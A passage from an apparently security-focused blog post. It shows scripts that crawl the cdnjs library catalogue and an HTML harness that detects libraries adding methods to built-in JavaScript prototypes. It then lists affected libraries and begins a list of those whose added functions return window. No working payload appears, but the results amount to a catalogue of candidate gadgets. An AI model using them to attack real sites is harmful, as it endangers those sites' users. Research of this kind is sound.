      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getLibraries</span><span class="token punctuation">(</span><span class="token parameter">keyword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> instance<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token constant">SEARCH_API_URL</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">params</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>keyword<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;page=0&amp;hitsPerPage=1000</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
        <span class="token literal-property property">restrictSearchableAttributes</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token string">'name'</span>
        <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token keyword">return</span> response<span class="token punctuation">.</span>data
<span class="token punctuation">&#125;</span>

<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After running, we can get a list of all the cdnjs libraries with their names.</p>
<h3><span id="find-all-js-files-for-each-library">Find all JS files for each library</span></h3><p>The basic information of the library is placed in algolia, but some details are placed in cdnjs’s own API.</p>
<p>The rules of this API are also very simple. The URL is: <a target="_blank" rel="noopener" href="https://api.cdnjs.com/libraries/$%7Bpackage_name%7D/$%7Bversion%7D">https://api.cdnjs.com/libraries/${package_name}/${version}</a>, so we can get the details of every libraries.</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libDetail.json'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token string">'./data/libDetail.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> existMap <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">let</span> detailItems <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libDetail.json'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> detailItems<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
  existMap<span class="token punctuation">[</span>item<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getDetail</span><span class="token punctuation">(</span><span class="token parameter">libName<span class="token punctuation">,</span> version</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://api.cdnjs.com/libraries/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>libName<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>version<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">axios</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">return</span> response<span class="token punctuation">.</span>data
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'failed:'</span><span class="token punctuation">,</span> libName<span class="token punctuation">,</span> err<span class="token punctuation">.</span>message<span class="token punctuation">)</span>
    <span class="token comment">//process.exit(1)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getLib</span><span class="token punctuation">(</span><span class="token parameter">libraries<span class="token punctuation">,</span> lib</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fetching:'</span><span class="token punctuation">,</span> lib<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
  <span class="token keyword">const</span> detail <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getDetail</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>name<span class="token punctuation">,</span> lib<span class="token punctuation">.</span>version<span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>detail<span class="token punctuation">)</span> <span class="token keyword">return</span>
  detailItems<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>detail<span class="token punctuation">)</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>detailItems<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">progress: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>detailItems<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>libraries<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> libraries <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libs.json'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> lib <span class="token keyword">of</span> libraries<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>existMap<span class="token punctuation">[</span>lib<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    <span class="token function">getLib</span><span class="token punctuation">(</span>libraries<span class="token punctuation">,</span> lib<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3><span id="find-the-libraries-we-want">Find the libraries we want</span></h3><p>The list of packages is available, and the files for each package are also available. Moving on to our final step: finding eligible libraries.</p>
<p>There are more than 4000 libraries on cdnjs. If we run them one by one, we must run more than 4000 times. But in fact, there should be a few that meet our conditions, so I choose to run the test for every 10 libraries. </p>
<p>If none of these 10 libraries have changed the prototype, then the next group, if any, use a binary search to find out which libraries have changed.</p>
<p>The HTML use for detection looks like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">function</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token parameter">prototype</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>prototype<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">var</span> protos <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">array</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token literal-property property">string</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token keyword">function</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- insert script here --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>...<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- insert script here --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> newProtos <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">array</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token literal-property property">string</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token keyword">function</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">prototypeFunctions</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token literal-property property">functionsReturnWindow</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'array'</span><span class="token punctuation">,</span> <span class="token string">'Array.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">'String.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token string">'Number.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'Object.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'function'</span><span class="token punctuation">,</span> <span class="token string">'Function.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
      <span class="token keyword">return</span> result
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> prototypeName<span class="token punctuation">,</span> prototype</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> oldFuncs <span class="token operator">=</span> protos<span class="token punctuation">[</span>name<span class="token punctuation">]</span>
      <span class="token keyword">const</span> newFuncs <span class="token operator">=</span> newProtos<span class="token punctuation">[</span>name<span class="token punctuation">]</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> fnName <span class="token keyword">of</span> newFuncs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldFuncs<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fnName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">const</span> fullName <span class="token operator">=</span> prototypeName <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fnName
          result<span class="token punctuation">.</span>prototypeFunctions<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fullName<span class="token punctuation">)</span>
          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>prototype<span class="token punctuation">[</span>fnName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              result<span class="token punctuation">.</span>functionsReturnWindow<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fullName<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Before the library is loaded, we first record the properties on each prototype. After loading the library, we record it again and compare it with the previous one to find out which properties were added after the library was introduced. Then we can also divide the results into two types, one is the method added to the prototype, and the other is the function that meets our criteria.</p>
<p>The complete code is a bit longer, you can check it: <a target="_blank" rel="noopener" href="https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js">https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js</a></p>
<p>But the process is roughly:</p>
<ol>
<li>For every ten libraries, find the library that pollute the prototype</li>
<li>After finding the library, find out which files are polluting the prototype</li>
<li>Print out the results</li>
</ol>
<h2><span id="result">Result</span></h2><p>Among the 4290 libraries, 74 (1.72%) libraries pollute your prototype. The list is as follows:</p>
<ol>
<li><code>6to5@3.6.5</code></li>
<li><code>Colors.js@1.2.4</code></li>
<li><code>Embetty@3.0.8</code></li>
<li><code>NicEdit@0.93</code></li>
<li><code>RGraph@606</code></li>
<li><code>ScrollTrigger@1.0.5</code></li>
<li><code>TableExport@5.2.0</code></li>
<li><code>ajv-async@1.0.1</code></li>
<li><code>angular-vertxbus@6.4.1</code></li>
<li><code>asciidoctor.js@1.5.9</code></li>
<li><code>aurelia-script@1.5.2</code></li>
<li><code>blendui@0.0.4</code></li>
<li><code>blissfuljs@1.0.6</code></li>
<li><code>bootstrap-calendar@0.2.5</code></li>
<li><code>carto.js@4.2.2</code></li>
<li><code>cignium-hypermedia-client@1.35.0</code></li>
<li><code>core-js@3.24.1</code></li>
<li><code>custombox@4.0.3</code></li>
<li><code>d3fc@11.0.0</code></li>
<li><code>d3plus@2.0.1</code></li>
<li><code>datejs@1.0</code></li>
<li><code>deb.js@0.0.2</code></li>
<li><code>defiant.js@2.2.7</code></li>
<li><code>eddy@0.7.0</code></li>
<li><code>ext-core@3.1.0</code></li>
<li><code>extjs@6.2.0</code></li>
<li><code>fs-tpp-api@2.4.4</code></li>
<li><code>highcharts@10.2.0</code></li>
<li><code>inheritance-js@0.4.12</code></li>
<li><code>jo@0.4.1</code></li>
<li><code>jquery-ajaxy@1.6.1</code></li>
<li><code>jquery-ui-bootstrap@0.5pre</code></li>
<li><code>js-bson@2.0.8</code></li>
<li><code>jslite@1.1.12</code></li>
<li><code>json-forms@1.6.3</code></li>
<li><code>keras-js@0.3.0</code></li>
<li><code>kwargsjs@1.0.1</code></li>
<li><code>leaflet.freedraw@2.0.1</code></li>
<li><code>lobipanel@1.0.6</code></li>
<li><code>melonjs@1.0.1</code></li>
<li><code>metro@4.4.3</code></li>
<li><code>mo@1.7.3</code></li>
<li><code>monet@0.9.3</code></li>
<li><code>mootools@1.6.0</code></li>
<li><code>oidc-client@1.11.5</code></li>
<li><code>opal@0.3.43</code></li>
<li><code>prototype@1.7.3</code></li>
<li><code>qcobjects@2.3.69</code></li>
<li><code>qoopido.demand@8.0.2</code></li>
<li><code>qoopido.js@3.7.4</code></li>
<li><code>qoopido.nucleus@3.2.15</code></li>
<li><code>quantumui@1.2.0</code></li>
<li><code>rantjs@1.0.6</code></li>
<li><code>rita@2.8.1</code></li>
<li><code>rivescript@2.2.0</code></li>
<li><code>scriptaculous@1.9.0</code></li>
<li><code>should.js@13.2.3</code></li>
<li><code>simple-gallery-js@1.0.3</code></li>
<li><code>simplecartjs@3.0.5</code></li>
<li><code>strapdown-topbar@1.6.4</code></li>
<li><code>string_score@0.1.22</code></li>
<li><code>survey-angular@1.9.45</code></li>
<li><code>survey-jquery@1.9.45</code></li>
<li><code>survey-knockout@1.9.45</code></li>
<li><code>survey-react@1.9.45</code></li>
<li><code>survey-vue@1.9.45</code></li>
<li><code>tablefilter@2.5.0</code></li>
<li><code>tmlib.js@0.5.2</code></li>
<li><code>tui-editor@1.4.10</code></li>
<li><code>typeis@1.1.2</code></li>
<li><code>uppy@3.0.0</code></li>
<li><code>vanta@0.5.22</code></li>
<li><code>waud.js@1.0.3</code></li>
<li><code>zui@1.10.0</code></li>
</ol>
<p>And of these 74 libraries, 12 (16.2%) meet our criteria, the list is as follows:</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/asciidoctor.js/1.5.9/asciidoctor.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Array.prototype.$concat"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$push"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$append"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$rotate!"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$shuffle!"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$sort"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$to_a"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$to_ary"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$unshift"</span><span class="token punctuation">,</span>
      <span class="token string">"Array.prototype.$prepend"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$initialize"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$chomp"</span><span class="token punctuation">,</span>
      <span class="token string">"String.prototype.$force_encoding"</span><span class="token punctuation">,</span>
      <span class="token string">"Function.prototype.$to_proc"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/jquery-ui-bootstrap/0.5pre/third-party/jQuery-UI-Date-Range-Picker/js/date.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Number.prototype.milliseconds"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.millisecond"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.seconds"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.second"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.minutes"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.minute"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.hours"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.hour"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.days"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.day"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.weeks"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.week"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.months"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.month"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.years"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.year"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/ext-core/3.1.0/ext-core.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Function.prototype.createInterceptor"</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#123;</span>
    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/datejs/1.0/date.min.js"</span><span class="token punctuation">,</span>
    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token string">"Number.prototype.milliseconds"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.millisecond"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.seconds"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.second"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.minutes"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.minute"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.hours"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.hour"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.days"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.day"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.weeks"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.week"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.months"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.month"</span><span class="token punctuation">,</span>
      <span class="token string">"Number.prototype.years"</span><span class="token punctuation">,</span>
